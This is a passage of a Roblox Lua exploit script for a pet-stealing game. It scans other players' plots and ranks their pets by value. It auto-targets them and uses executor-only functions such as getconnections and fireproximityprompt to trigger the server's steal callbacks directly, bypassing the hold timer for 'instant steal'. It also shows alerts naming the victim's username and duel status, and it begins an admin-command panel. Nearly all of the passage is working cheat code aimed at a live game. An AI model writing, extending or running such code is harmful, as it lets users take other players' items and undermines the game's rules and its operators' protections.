            btn.BackgroundColor3       = on and Color3.fromRGB(20, 22, 38) or Color3.fromRGB(8,8,12)
            btn.TextColor3             = on and Color3.fromRGB(180, 185, 220) or Color3.fromRGB(55, 58, 85)
        end
        styleBtn(miniNearest,  n)
        styleBtn(miniHighest,  h)
        styleBtn(miniPriority, p)
    end
    SharedState._refreshMiniModeBar = refreshMiniBar
    refreshMiniBar()

    miniNearest.MouseButton1Click:Connect(function()
        SharedState.SetStealMode("nearest"); refreshMiniBar()
    end)
    miniHighest.MouseButton1Click:Connect(function()
        SharedState.SetStealMode("highest"); refreshMiniBar()
    end)
    miniPriority.MouseButton1Click:Connect(function()
        SharedState.SetStealMode("priority"); refreshMiniBar()
    end)

    local _lastUID = nil
    do
        local _miniLast = 0
        RunService.Heartbeat:Connect(function()
            if not tCard.Parent then return end
            local now = os.clock()
            if now - _miniLast < 0.1 then return end
            _miniLast = now
            local sel = SharedState.SelectedPetData
            local uid = sel and sel.uid
            if uid ~= _lastUID then _lastUID = uid; refreshMiniBar() end
        end)
    end
    -- ── End target bar ──
    local customizePriorityBtn = Instance.new("TextButton", toggleBtnContainer)

    customizePriorityBtn.Size = UDim2.new(1,0,0,24); customizePriorityBtn.Position = UDim2.new(0,0,0,92)

    customizePriorityBtn.BackgroundColor3 = Color3.fromRGB(90,140,255)

    customizePriorityBtn.Text = "CUSTOMIZE PRIORITY"; customizePriorityBtn.Font = Enum.Font.GothamBold

    customizePriorityBtn.TextSize = 10; customizePriorityBtn.TextColor3 = Color3.new(1,1,1)

    Instance.new("UICorner", customizePriorityBtn).CornerRadius = UDim.new(0, 6)

    customizePriorityBtn.Visible = true

    

    customizePriorityBtn.MouseButton1Click:Connect(function()

        local priorityGui = PlayerGui:FindFirstChild("PriorityListGUI")

        if priorityGui then

            priorityGui.Enabled = not priorityGui.Enabled

            if priorityGui.Enabled and SharedState.RefreshPriorityGUI then SharedState.RefreshPriorityGUI() end

        end

    end)

    local instantStealBtn = Instance.new("TextButton", toggleBtnContainer)

    instantStealBtn.Size = UDim2.new(1,0,0,24*uiScale); instantStealBtn.Position = UDim2.new(0,0,0,116*uiScale)

    instantStealBtn.BackgroundColor3 = instantStealEnabled and Color3.fromRGB(80, 140, 255) or Color3.fromRGB(22,22,35)

    instantStealBtn.Text = instantStealEnabled and "INSTANT STEAL: ON" or "INSTANT STEAL: OFF"; instantStealBtn.Font = Enum.Font.GothamBold

    instantStealBtn.TextSize = 10*uiScale; instantStealBtn.TextColor3 = instantStealEnabled and Color3.new(0,0,0) or Color3.fromRGB(185,188,215)

    Instance.new("UICorner", instantStealBtn).CornerRadius = UDim.new(0, 6)

    instantStealBtn.MouseButton1Click:Connect(function()

        instantStealEnabled = not instantStealEnabled

        if not instantStealEnabled then

            instantStealReady = false

            instantStealDidInit = false

        end

        Config.InstantSteal = instantStealEnabled

        SaveConfig()

        instantStealBtn.Text = instantStealEnabled and "INSTANT STEAL: ON" or "INSTANT STEAL: OFF"

        instantStealBtn.BackgroundColor3 = instantStealEnabled and Color3.fromRGB(80, 140, 255) or Color3.fromRGB(22,22,35)

        instantStealBtn.TextColor3 = instantStealEnabled and Color3.new(0,0,0) or Color3.fromRGB(185,188,215)

        SharedState.ListNeedsRedraw = false; updateUI(autoStealEnabled, get_all_pets())

    end)

    local function findProximityPromptForAnimal(animalData)

        if not animalData then return nil end

        local cp = PromptMemoryCache[animalData.uid]

        if cp and cp.Parent then return cp end

        local plot = Workspace.Plots:FindFirstChild(animalData.plot); if not plot then return nil end

        local podiums = plot:FindFirstChild("AnimalPodiums"); if not podiums then return nil end

        

        

        local ch = Synchronizer:Get(plot.Name)

        if not ch then

            

            local podium = podiums:FindFirstChild(animalData.slot)

            if podium then

                local base = podium:FindFirstChild("Base")

                local spawn = base and base:FindFirstChild("Spawn")

                if spawn then

                    local attach = spawn:FindFirstChild("PromptAttachment")

                    if attach then

                        for _, p in ipairs(attach:GetChildren()) do

                            if p:IsA("ProximityPrompt") then

                                PromptMemoryCache[animalData.uid] = p

                                return p

                            end

                        end

                    end

                end

            end

            return nil

        end

        

        local al = ch:Get("AnimalList")

        if not al then return nil end

        

        local brainrotName = animalData.name and animalData.name:lower() or ""

        local targetSlot = animalData.slot

        

        

        local foundPodium = nil

        for slot, ad in pairs(al) do

            if type(ad) == "table" and tostring(slot) == targetSlot then

                local aName, aInfo = ad.Index, AnimalsData[ad.Index]

                if aInfo and (aInfo.DisplayName or aName):lower() == brainrotName then

                    foundPodium = podiums:FindFirstChild(tostring(slot))

                    break

                end

            end

        end

        

        

        if not foundPodium then

            foundPodium = podiums:FindFirstChild(animalData.slot)

        end

        

        if foundPodium then

            local base = foundPodium:FindFirstChild("Base")

            local spawn = base and base:FindFirstChild("Spawn")

            if spawn then

                

                local attach = spawn:FindFirstChild("PromptAttachment")

                if attach then

                    for _, p in ipairs(attach:GetChildren()) do

                        if p:IsA("ProximityPrompt") and p.Enabled and p.ActionText == "Steal" then

                            PromptMemoryCache[animalData.uid] = p

                            return p

                        end

                    end

                end

                

                

                local startPos = spawn.Position

                local slotX, slotZ = startPos.X, startPos.Z

                local nearestPrompt = nil

                local minDist = math.huge

                

                for _, desc in pairs(plot:GetDescendants()) do

                    if desc:IsA("ProximityPrompt") and desc.Enabled and desc.ActionText == "Steal" then

                        local part = desc.Parent

                        local promptPos = nil

                        

                        if part and part:IsA("BasePart") then

                            promptPos = part.Position

                        elseif part and part:IsA("Attachment") and part.Parent and part.Parent:IsA("BasePart") then

                            promptPos = part.Parent.Position

                        end

                        

                        if promptPos then

                            local checkStartY = startPos.Y

                            if brainrotName:find("la secret combinasion") then

                                checkStartY = startPos.Y - 5

                            end

                            local horizontalDist = math.sqrt((promptPos.X - slotX)^2 + (promptPos.Z - slotZ)^2)

                            if horizontalDist < 5 and promptPos.Y > checkStartY then

                                local yDist = promptPos.Y - checkStartY

                                if yDist < minDist then

                                    minDist = yDist

                                    nearestPrompt = desc

                                end

                            end

                        end

                    end

                end

                

                if nearestPrompt then

                    PromptMemoryCache[animalData.uid] = nearestPrompt

                    return nearestPrompt

                end

            end

        end

        

        return nil

    end

    local STEAL_DURATION = 0.8

    local function buildStealCallbacks(prompt)

        if InternalStealCache[prompt] then return end

        local data = {holdCallbacks = {}, triggerCallbacks = {}, holdEndCallbacks = {}, ready = true}

        local ok1, conns1 = pcall(getconnections, prompt.PromptButtonHoldBegan)

        if ok1 and type(conns1) == "table" then

            for _, conn in ipairs(conns1) do

                if type(conn.Function) == "function" then

                    table.insert(data.holdCallbacks, conn.Function)

                end

            end

        end

        local ok2, conns2 = pcall(getconnections, prompt.Triggered)

        if ok2 and type(conns2) == "table" then

            for _, conn in ipairs(conns2) do

                if type(conn.Function) == "function" then

                    table.insert(data.triggerCallbacks, conn.Function)

                end

            end

        end

        local ok3, conns3 = pcall(getconnections, prompt.PromptButtonHoldEnded)

        if ok3 and type(conns3) == "table" then

            for _, conn in ipairs(conns3) do

                if type(conn.Function) == "function" then

                    table.insert(data.holdEndCallbacks, conn.Function)

                end

            end

        end

        if (#data.holdCallbacks > 0) or (#data.triggerCallbacks > 0) or (#data.holdEndCallbacks > 0) then

            InternalStealCache[prompt] = data

        end

    end

    local function runCallbackList(list)

        for _, fn in ipairs(list) do

            task.spawn(fn)

        end

    end

    local INSTANT_STEAL_RADIUS = 60

    local INSTANT_STEAL_COOLDOWN = 0.04

    local lastInstantStealTime = 0

    local function isMyPlot_Instant(plotName)

        local plots = workspace:FindFirstChild("Plots")

        if not plots then return false end

        local plot = plots:FindFirstChild(plotName)

        if not plot then return false end

        local sign = plot:FindFirstChild("PlotSign")

        if not sign then return false end

        local yb = sign:FindFirstChild("YourBase")

        return yb and yb:IsA("BillboardGui") and yb.Enabled

    end

    local function findNearestPrompt_Instant()

        local hrp = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")

        if not hrp then return nil, math.huge, nil end

        local plots = workspace:FindFirstChild("Plots")

        if not plots then return nil, math.huge, nil end

        -- Parse MinimumNearest
        local minNearest = 0
        do
            local raw = Config.MinimumNearest or ""
            if raw ~= "" then
                local s = raw:lower():gsub(",", ""):gsub("%s", "")
                local num, suffix = s:match("^([%d%.]+)([kmbt]?)$")
                if num then
                    local n = tonumber(num) or 0
                    local mult = {k=1e3, m=1e6, b=1e9, t=1e12}
                    minNearest = n * (mult[suffix] or 1)
                end
            end
        end

        local bestPrompt, bestDist, bestName = nil, math.huge, nil

        for _, plot in ipairs(plots:GetChildren()) do

            if isMyPlot_Instant(plot.Name) then continue end

            local plotDist = math.huge

            pcall(function() plotDist = (plot:GetPivot().Position - hrp.Position).Magnitude end)

            if plotDist > INSTANT_STEAL_RADIUS + 40 then continue end

            local podiums = plot:FindFirstChild("AnimalPodiums")

            if not podiums then continue end

            for _, pod in ipairs(podiums:GetChildren()) do

                local base = pod:FindFirstChild("Base")

                local spawn = base and base:FindFirstChild("Spawn")

                if not spawn then continue end

                local dist = (spawn.Position - hrp.Position).Magnitude

                if dist > INSTANT_STEAL_RADIUS or dist >= bestDist then continue end

                -- MinimumNearest filter: check genValue from allAnimalsCache
                if minNearest > 0 then
                    local slotStr = pod.Name
                    local passesMin = false
                    if allAnimalsCache then
                        for _, a in ipairs(allAnimalsCache) do
                            if a.plot == plot.Name and tostring(a.slot) == slotStr then
                                if (tonumber(a.genValue) or 0) >= minNearest then
                                    passesMin = true
                                end
                                break
                            end
                        end
                    end
                    if not passesMin then continue end
                end

                local att = spawn:FindFirstChild("PromptAttachment")

                if not att then continue end

                local prompt = att:FindFirstChildOfClass("ProximityPrompt")

                if prompt and prompt.Parent and prompt.Enabled then

                    bestPrompt = prompt

                    bestDist = dist

                    bestName = pod.Name

                end

            end

        end

        return bestPrompt, bestDist, bestName

    end

    -- STEAL: fireproximityprompt + direct remote callbacks

    local function executeInstantSteal(prompt)

        if not prompt or not prompt.Parent or not prompt.Enabled then return end

        local now = os.clock()

        if now - lastInstantStealTime < INSTANT_STEAL_COOLDOWN then return end

        lastInstantStealTime = now

        -- Fire the proximity prompt (mimics real E press)

        pcall(function()

            if fireproximityprompt then

                fireproximityprompt(prompt)

            end

        end)

        -- Also fire server remote directly via getconnections callbacks

        task.spawn(function()

            buildStealCallbacks(prompt)

            local data = InternalStealCache[prompt]

            if data then

                if #data.holdCallbacks > 0 then

                    runCallbackList(data.holdCallbacks)

                end

                task.wait(0.05)

                if #data.triggerCallbacks > 0 then

                    runCallbackList(data.triggerCallbacks)

                end

            end

        end)

    end

    local function executeInternalStealAsync(prompt, animalUID)

        local data = InternalStealCache[prompt]

        if not data or not data.ready then return false end

        data.ready = false

        task.spawn(function()

            if currentStealTargetUID ~= animalUID then

                if activeProgressTween then activeProgressTween:Cancel() end

                resetProgressVisual()

                currentStealTargetUID = animalUID

            end

            -- Hold begin

            if #data.holdCallbacks > 0 then

                runCallbackList(data.holdCallbacks)

            end

            resetProgressVisual()

            runProgressTimer()

            if currentStealTargetUID == animalUID and #data.triggerCallbacks > 0 then

                runCallbackList(data.triggerCallbacks)

            end

            data.ready = true

        end)

        return true

    end

    local function attemptSteal(prompt, animalUID)

        if not prompt or not prompt.Parent then return false end

        buildStealCallbacks(prompt)

        if not InternalStealCache[prompt] then return false end

        if currentStealTargetUID ~= animalUID then

            if activeProgressTween then

                activeProgressTween:Cancel()

                activeProgressTween = nil

            end

            resetProgressVisual()

        end

        return executeInternalStealAsync(prompt, animalUID)

    end

    local function prebuildStealCallbacks()

        for _, prompt in pairs(PromptMemoryCache) do

            if prompt and prompt.Parent then

                buildStealCallbacks(prompt)

            end

        end

    end

    task.spawn(function()

        while task.wait(2) do

            if autoStealEnabled then

                prebuildStealCallbacks()

            end

        end

    end)

    local lastAnimalData = {}

    local function getAnimalHash(al)

        if not al then return "" end; local h=""

        for slot, d in pairs(al) do if type(d)=="table" then h=h..tostring(slot)..tostring(d.Index)..tostring(d.Mutation) end end

        return h

    end

    local function scanSinglePlot(plot)

        local changed = false

        pcall(function()

            local ch = Synchronizer:Get(plot.Name); if not ch then return end

            local al = ch:Get("AnimalList")

            local hash = getAnimalHash(al)

            if lastAnimalData[plot.Name]==hash then return end

            lastAnimalData[plot.Name]=hash; changed=true

            for i=#allAnimalsCache,1,-1 do if allAnimalsCache[i].plot==plot.Name then table.remove(allAnimalsCache,i) end end

            local owner = ch:Get("Owner")

            if not owner or not Players:FindFirstChild(owner.Name) then return end

            local ownerName = owner.Name or "Unknown"

            if not al then return end

            for slot, ad in pairs(al) do

                if type(ad)=="table" then

                    local aName, aInfo = ad.Index, AnimalsData[ad.Index]

                    if aInfo then

                        local mut = ad.Mutation or "None"

                        if mut == "Yin Yang" then mut = "YinYang" end

                        local traits = (ad.Traits and #ad.Traits>0) and table.concat(ad.Traits,", ") or "None"

                        local gv = AnimalsShared:GetGeneration(aName, ad.Mutation, ad.Traits, nil)

                        local gt = "$"..NumberUtils:ToString(gv).."/s"

                        table.insert(allAnimalsCache, {

                            name=aInfo.DisplayName or aName, index=aName, genText=gt, genValue=gv,

                            mutation=mut, traits=traits, owner=ownerName,

                            plot=plot.Name, slot=tostring(slot), uid=plot.Name.."_"..tostring(slot)

                        })

                    end

                end

            end

        end)

        if changed then

            table.sort(allAnimalsCache, function(a,b) return a.genValue>b.genValue end)

            SharedState.ListNeedsRedraw = true

            

            

            if not hasShownPriorityAlert and Config.AlertsEnabled then

                task.spawn(function()

                    

                    local foundPriorityPet = nil

                    for i = 1, #PRIORITY_LIST do

                        local priorityName = PRIORITY_LIST[i]

                        local searchName = priorityName:lower()

                        

                        

                        for _, pet in ipairs(allAnimalsCache) do

                            if pet.name and pet.name:lower() == searchName then

                                foundPriorityPet = pet

                                break

                            end

                        end

                        

                        

                        if foundPriorityPet then

                            break

                        end

                    end

                    

                    if foundPriorityPet then

                        

                        local ownerUsername = foundPriorityPet.owner

                        local ownerPlayer = nil

                        

                        local plot = Workspace:FindFirstChild("Plots") and Workspace.Plots:FindFirstChild(foundPriorityPet.plot)

                        if plot then

                            

                            local sync = Synchronizer

                            if not sync then

                                local Packages = ReplicatedStorage:FindFirstChild("Packages")

                                if Packages then

                                    local ok, syncModule = pcall(function() return require(Packages:WaitForChild("Synchronizer")) end)

                                    if ok then sync = syncModule end

                                end

                            end

                            

                            if sync then

                                local ok, ch = pcall(function() return sync:Get(plot.Name) end)

                                if ok and ch then

                                    local owner = ch:Get("Owner")

                                    if owner then

                                        if typeof(owner) == "Instance" and owner:IsA("Player") then

                                            ownerPlayer = owner

                                            ownerUsername = owner.Name

                                        elseif type(owner) == "table" and owner.Name then

                                            ownerUsername = owner.Name

                                            ownerPlayer = Players:FindFirstChild(owner.Name)

                                        end

                                    end

                                end

                            end

                        end

                        

                        

                        if not ownerPlayer and ownerUsername then

                            ownerPlayer = Players:FindFirstChild(ownerUsername)

                        end

                        

                        ShowPriorityAlert(foundPriorityPet.name, foundPriorityPet.genText, foundPriorityPet.mutation, ownerUsername)

                    end

                end)

            end

        end

    end

    local function setupPlotListener(plot)

        local ch, retries = nil, 0

        while not ch and retries<50 do

            local ok, r = pcall(function() return Synchronizer:Get(plot.Name) end)

            if ok and r then ch=r; break else retries=retries+1; task.wait(0.1) end

        end

        if not ch then return end

        scanSinglePlot(plot)

        local _plotScanQueued = false
        local function queuePlotScan()
            if _plotScanQueued then return end
            _plotScanQueued = true
            task.delay(1, function()
                _plotScanQueued = false
                pcall(scanSinglePlot, plot)
            end)
        end
        plot.DescendantAdded:Connect(queuePlotScan)
        plot.DescendantRemoving:Connect(queuePlotScan)

        task.spawn(function() while plot.Parent do task.wait(5); scanSinglePlot(plot) end end)

    end

    local plots = Workspace:WaitForChild("Plots", 8)

    if plots then

        for _, p in ipairs(plots:GetChildren()) do setupPlotListener(p) end

        plots.ChildAdded:Connect(function(p) task.wait(0.5); setupPlotListener(p) end)

        plots.ChildRemoved:Connect(function(p)

            lastAnimalData[p.Name]=nil

            for i=#allAnimalsCache,1,-1 do if allAnimalsCache[i].plot==p.Name then table.remove(allAnimalsCache,i) end end

            SharedState.ListNeedsRedraw=true

        end)

    end

    

    local hasShownPriorityAlert = false

    

    ShowPriorityAlert = function(brainrotName, genText, mutation, ownerUsername)

        if not Config.AlertsEnabled then return end

        if hasShownPriorityAlert then return end

        

        local ownerPlayer = ownerUsername and Players:FindFirstChild(ownerUsername) or nil

        local isInDuel = ownerPlayer and ownerPlayer:GetAttribute("__duels_block_steal") == true or false

        local duelStatusText = isInDuel and "IN DUEL" or "NOT IN DUEL"

        local duelStatusColor = isInDuel and Color3.fromRGB(255, 0, 0) or Color3.fromRGB(0, 255, 0)

        

        local mutationColors = {

            ["rainbow"] = Color3.fromRGB(170, 170, 170),

            ["bloodrot"] = Color3.fromRGB(120, 120, 120),

            ["candy"] = Color3.fromRGB(185, 185, 185),

            ["radioactive"] = Color3.fromRGB(160, 160, 160),

            ["cursed"] = Color3.fromRGB(130, 130, 130),

            ["gold"] = Color3.fromRGB(190, 190, 190),

            ["diamond"] = Color3.fromRGB(210, 210, 210),

            ["yinyang"] = Color3.fromRGB(230, 230, 230),

            ["lava"] = Color3.fromRGB(140, 140, 140)

        }

        

        local normalizedMutation = mutation and mutation:gsub("%s+", ""):lower() or ""

        local color = mutationColors[normalizedMutation] or Color3.fromRGB(170, 170, 170)

        

        local existing = PlayerGui:FindFirstChild("BullysPriorityAlert")

        if existing then existing:Destroy() end

        local alertGui = Instance.new("ScreenGui")

        alertGui.Name = "BullysPriorityAlert"

        alertGui.ResetOnSpawn = false

        alertGui.DisplayOrder = 999

        alertGui.Parent = PlayerGui

        hasShownPriorityAlert = true

        -- Cor do traçado em volta: verde = disponível, vermelho = em duelo

        local borderColor = isInDuel and Color3.fromRGB(230, 70, 70) or Color3.fromRGB(70, 200, 110)

        local TEXT_1  = Color3.fromRGB(235, 237, 245)

        local TEXT_2  = Color3.fromRGB(150, 155, 170)

        -- Card clean, centralizado, ACIMA dos botões unlock (123)

        local card = Instance.new("Frame", alertGui)

        card.Size        = UDim2.new(0, 320, 0, 66)

        card.AnchorPoint = Vector2.new(0.5, 1)

        card.Position    = UDim2.new(0.5, 0, 1, -150)

        card.BackgroundColor3 = Color3.fromRGB(22, 24, 30)

        card.BorderSizePixel  = 0

        Instance.new("UICorner", card).CornerRadius = UDim.new(0, 8)

        -- Traço AO REDOR de toda a embed (cor reflete status)

        local border = Instance.new("UIStroke", card)

        border.Color        = borderColor

        border.Thickness    = 2

        border.Transparency = 0

        border.ApplyStrokeMode = Enum.ApplyStrokeMode.Border

        -- Nome do brainrot + gen (linha 1)

        local nameLbl = Instance.new("TextLabel", card)

        nameLbl.Size       = UDim2.new(1, -24, 0, 22)

        nameLbl.Position   = UDim2.new(0, 12, 0, 14)

        nameLbl.BackgroundTransparency = 1

        nameLbl.Text       = brainrotName .. " - " .. genText

        nameLbl.Font       = Enum.Font.GothamBold

        nameLbl.TextSize   = 14

        nameLbl.TextColor3 = TEXT_1

        nameLbl.TextXAlignment = Enum.TextXAlignment.Left

        nameLbl.TextTruncate   = Enum.TextTruncate.AtEnd

        -- Owner (linha 2, discreto)

        if ownerUsername and ownerUsername ~= "" then

            local ownerLbl = Instance.new("TextLabel", card)

            ownerLbl.Size       = UDim2.new(1, -24, 0, 14)

            ownerLbl.Position   = UDim2.new(0, 12, 0, 40)

            ownerLbl.BackgroundTransparency = 1

            ownerLbl.Text       = "@" .. ownerUsername

            ownerLbl.Font       = Enum.Font.Gotham

            ownerLbl.TextSize   = 11

            ownerLbl.TextColor3 = TEXT_2

            ownerLbl.TextXAlignment = Enum.TextXAlignment.Left

        end

        -- Fade-in simples

        card.BackgroundTransparency = 1

        border.Transparency = 1

        TweenService:Create(card, TweenInfo.new(0.25, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {

            BackgroundTransparency = 0

        }):Play()

        TweenService:Create(border, TweenInfo.new(0.25, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {

            Transparency = 0

        }):Play()

        if Config.AlertSoundID and Config.AlertSoundID ~= "" then

            local sound = Instance.new("Sound")

            sound.SoundId = Config.AlertSoundID

            sound.Volume  = 0.5

            sound.Parent  = card

            sound:Play()

            sound.Ended:Connect(function() sound:Destroy() end)

        end

        task.delay(4, function()

            TweenService:Create(card, TweenInfo.new(0.25, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {

                BackgroundTransparency = 1

            }):Play()

            TweenService:Create(border, TweenInfo.new(0.25, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {

                Transparency = 1

            }):Play()

            task.wait(0.3)

            alertGui:Destroy()

        end)

    end

    

    

    task.spawn(function()

        task.wait(0.5)  

        while true do

            task.wait(0.5)  

            if not hasShownPriorityAlert and Config.AlertsEnabled and #allAnimalsCache > 0 then

                

                local foundPriorityPet = nil

                for i = 1, #PRIORITY_LIST do

                    local priorityName = PRIORITY_LIST[i]

                    local searchName = priorityName:lower()

                    

                    

                    for _, pet in ipairs(allAnimalsCache) do

                        if pet.name and pet.name:lower() == searchName then

                            foundPriorityPet = pet

                            break

                        end

                    end

                    

                    

                    if foundPriorityPet then

                        break

                    end

                end

                

                if foundPriorityPet then

                    

                    local ownerUsername = foundPriorityPet.owner

                    local ownerPlayer = nil

                    

                    local plot = Workspace:FindFirstChild("Plots") and Workspace.Plots:FindFirstChild(foundPriorityPet.plot)

                    if plot then

                        

                        local sync = Synchronizer

                        if not sync then

                            local Packages = ReplicatedStorage:FindFirstChild("Packages")

                            if Packages then

                                local ok, syncModule = pcall(function() return require(Packages:WaitForChild("Synchronizer")) end)

                                if ok then sync = syncModule end

                            end

                        end

                        

                        if sync then

                            local ok, ch = pcall(function() return sync:Get(plot.Name) end)

                            if ok and ch then

                                local owner = ch:Get("Owner")

                                if owner then

                                    if typeof(owner) == "Instance" and owner:IsA("Player") then

                                        ownerPlayer = owner

                                        ownerUsername = owner.Name

                                    elseif type(owner) == "table" and owner.Name then

                                        ownerUsername = owner.Name

                                        ownerPlayer = Players:FindFirstChild(owner.Name)

                                    end

                                end

                            end

                        end

                    end

                    

                    

                    if not ownerPlayer and ownerUsername then

                        ownerPlayer = Players:FindFirstChild(ownerUsername)

                    end

                    

                    ShowPriorityAlert(foundPriorityPet.name, foundPriorityPet.genText, foundPriorityPet.mutation, ownerUsername)

                end

            end

        end

    end)

    task.spawn(function()

        while true do

            task.wait(0.5)

            autoStealEnabled = true

            if autoStealEnabled then

                local pets = get_all_pets()

                if #pets > 0 then

                    local function applySelection(newIndex)

                        if newIndex and newIndex >= 1 and newIndex <= #pets and selectedTargetIndex ~= newIndex then

                            selectedTargetIndex = newIndex

                            selectedTargetUID = pets[newIndex].uid

                            SharedState.ListNeedsRedraw = false

                            updateUI(autoStealEnabled, pets)

                        end

                    end

                    local manualFound = false

                    if State.manualTargetEnabled and selectedTargetUID then

                        for i, p in ipairs(pets) do

                            if p.uid == selectedTargetUID then

                                if selectedTargetIndex ~= i then

                                    selectedTargetIndex = i

                                    updateUI(autoStealEnabled, pets)

                                end

                                manualFound = true

                                break

                            end

                        end

                    end

                    if manualFound then

                        -- Manual selection takes priority as long as pet exists

                    elseif stealPriorityEnabled then

                        local foundPrioIndex = nil

                        for _, pName in ipairs(PRIORITY_LIST) do

                            local searchName = pName:lower()

                            for i, p in ipairs(pets) do

                                if p.petName and p.petName:lower() == searchName then

                                    foundPrioIndex = i

                                    break

                                end

                            end

                            if foundPrioIndex then break end

                        end

                        if foundPrioIndex then

                            applySelection(foundPrioIndex)

                        else

                            applySelection(1)

                        end

                    elseif stealNearestEnabled then

                        local char = LocalPlayer.Character

                        local hrp = char and char:FindFirstChild("HumanoidRootPart")

                        if hrp then

                            local bestIndex = nil

                            local bestDist = math.huge

                            local minNearest = 0
                            do
                                local raw = Config.MinimumNearest or ""
                                if raw ~= "" then
                                    local s = raw:lower():gsub(",", ""):gsub("%s", "")
                                    local num, suffix = s:match("^([%d%.]+)([kmbt]?)$")
                                    if num then
                                        local n = tonumber(num) or 0
                                        local mult = {k=1e3, m=1e6, b=1e9, t=1e12}
                                        minNearest = n * (mult[suffix] or 1)
                                    end
                                end
                            end

                            for i, p in ipairs(pets) do

                                -- Filtro MinimumNearest: ignora pets abaixo do valor mínimo
                                if minNearest > 0 and (tonumber(p.mpsValue) or 0) < minNearest then
                                    continue
                                end

                                local targetPart = p.animalData and findAdorneeGlobal(p.animalData)

                                if targetPart and targetPart:IsA("BasePart") then

                                    local d = (hrp.Position - targetPart.Position).Magnitude

                                    if d < bestDist then

                                        bestDist = d

                                        bestIndex = i

                                    end

                                end

                            end

                            if bestIndex then

                                applySelection(bestIndex)

                            else

                                applySelection(1)

                            end

                        else

                            applySelection(1)

                        end

                    elseif stealHighestEnabled then

                        applySelection(1)

                    else

                        State.manualTargetEnabled = false

                    end

                end

            end

        end

    end)

    RunService.Heartbeat:Connect(function()

        if not autoStealEnabled then

            autoStealEnabled = true

        end

        if instantStealEnabled then

            if activeProgressTween then activeProgressTween:Cancel() activeProgressTween = nil end

            setProgressVisualFull()

            if not instantStealDidInit then

                instantStealDidInit = true

                task.spawn(function()

                    if not game:IsLoaded() then game.Loaded:Wait() end

                    task.wait(0.5)

                    instantStealReady = true

                end)

            end

            if instantStealReady then

                if stealNearestEnabled then

                    local prompt, dist, name = findNearestPrompt_Instant()

                    if prompt and dist <= INSTANT_STEAL_RADIUS then

                        executeInstantSteal(prompt)

                    end

                else

                    local pets = get_all_pets()

                    if #pets > 0 then

                        if selectedTargetIndex > #pets then selectedTargetIndex = #pets end

                        if selectedTargetIndex < 1 then selectedTargetIndex = 1 end

                        local tp = pets[selectedTargetIndex]

                        if tp and not isMyBaseAnimal(tp.animalData) then

                            local pr = PromptMemoryCache[tp.uid]

                            if not pr or not pr.Parent then

                                pr = findProximityPromptForAnimal(tp.animalData)

                            end

                            if pr then

                                executeInstantSteal(pr)

                            end

                        end

                    end

                end

            end

            return

        end

        local pets = get_all_pets()

        if #pets == 0 then return end

        if selectedTargetIndex > #pets then selectedTargetIndex = #pets end

        if selectedTargetIndex < 1 then selectedTargetIndex = 1 end

        local tp = pets[selectedTargetIndex]

        if not tp or isMyBaseAnimal(tp.animalData) then return end

        local pr = PromptMemoryCache[tp.uid]

        if not pr or not pr.Parent then

            pr = findProximityPromptForAnimal(tp.animalData)

        end

        if pr then

            attemptSteal(pr, tp.uid)

        end

    end)

    task.spawn(function() while task.wait(0.5) do updateUI(autoStealEnabled, get_all_pets()) end end)

    task.delay(1, function() SharedState.ListNeedsRedraw=true; updateUI(autoStealEnabled, get_all_pets()) end)

    task.spawn(function() while true do SharedState.AllAnimalsCache=allAnimalsCache; task.wait(0.5) end end)



end)

task.spawn(function()

    local COOLDOWNS = {

        rocket = 120, ragdoll = 30, balloon = 30, inverse = 60,

        nightvision = 60, jail = 60, tiny = 60, jumpscare = 60, morph = 60

    }

    local ALL_COMMANDS = {

        "balloon", "inverse", "jail", "jumpscare", "morph", 

        "nightvision", "ragdoll", "rocket", "tiny"

    }

    local activeCooldowns = {} 

    SharedState.AdminButtonCache = {}

    BlacklistedPlayers = Config.Blacklist or {}

    addToBlacklist = function(username)

        if not username or username == "" then return false end

        local lower = string.lower(username)

        for _, v in ipairs(BlacklistedPlayers) do

            if string.lower(v) == lower then return false end

        end

        table.insert(BlacklistedPlayers, username)

        Config.Blacklist = BlacklistedPlayers

        SaveConfig()

        return true

    end

    removeFromBlacklist = function(username)

        if not username or username == "" then return false end

        local lower = string.lower(username)

        for i, v in ipairs(BlacklistedPlayers) do

            if string.lower(v) == lower then

                table.remove(BlacklistedPlayers, i)

                Config.Blacklist = BlacklistedPlayers

                SaveConfig()

                if _G.removeBlacklistESP then

                    local p = Players:FindFirstChild(username)

                    if p then _G.removeBlacklistESP(p) end

                end

                return true

            end

        end

        return false

    end

    isBlacklisted = function(username)

        if not username then return false end

        local lower = string.lower(tostring(username))

        for _, v in ipairs(BlacklistedPlayers) do

            if string.lower(tostring(v)) == lower then return true end

        end

        return false

    end

    canUseAdminAction = function(targetPlayer)

        if not targetPlayer then return false end

        if isBlacklisted(targetPlayer.Name) then

            ShowNotification("BLACKLIST", targetPlayer.Name .. " is blacklisted")

            return false

        end

        return true

    end

    local function adminGetSync()

        local ok, m = pcall(function()

            return require(ReplicatedStorage:WaitForChild("Packages"):WaitForChild("Synchronizer"))

        end)

        return ok and m or nil

    end

    local adminGui = Instance.new("ScreenGui")

    adminGui.Name = "XiAdminPanel"

    adminGui.ResetOnSpawn = false

    adminGui.Parent = PlayerGui

    local frame = Instance.new("Frame")

    local mobileScale = IS_MOBILE and 0.65 or 1

    frame.Size = UDim2.new(0, 520, 0, 440)

    frame.Position = UDim2.new(Config.Positions.AdminPanel.X, 0, Config.Positions.AdminPanel.Y, 0)

    frame.BackgroundColor3 = Color3.fromRGB(10,10,14)

    frame.BackgroundTransparency = 0.08

    frame.BorderSizePixel = 0

    frame.Parent = adminGui

    

    -- Forward-declare

    local listFrame

    local layout

    ApplyViewportUIScaleAdmin(frame, 400, 450, 0.45, 0.85)

    AddMobileMinimizeAdmin(frame, "ADMIN")

    

    Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 10)
    local frmStroke = Instance.new("UIStroke", frame)
    frmStroke.Color = Color3.fromRGB(40, 42, 55); frmStroke.Thickness = 1.5; frmStroke.Transparency = 0.3

    -- ── Sidebar ──
    local sidebar = Instance.new("Frame", frame)
    sidebar.Size = UDim2.new(0, 80, 1, -50)
    sidebar.Position = UDim2.new(0, 6, 0, 44)
    sidebar.BackgroundColor3 = Color3.fromRGB(14, 14, 18)
    sidebar.BackgroundTransparency = 0.2
    sidebar.BorderSizePixel = 0
    Instance.new("UICorner", sidebar).CornerRadius = UDim.new(0, 7)

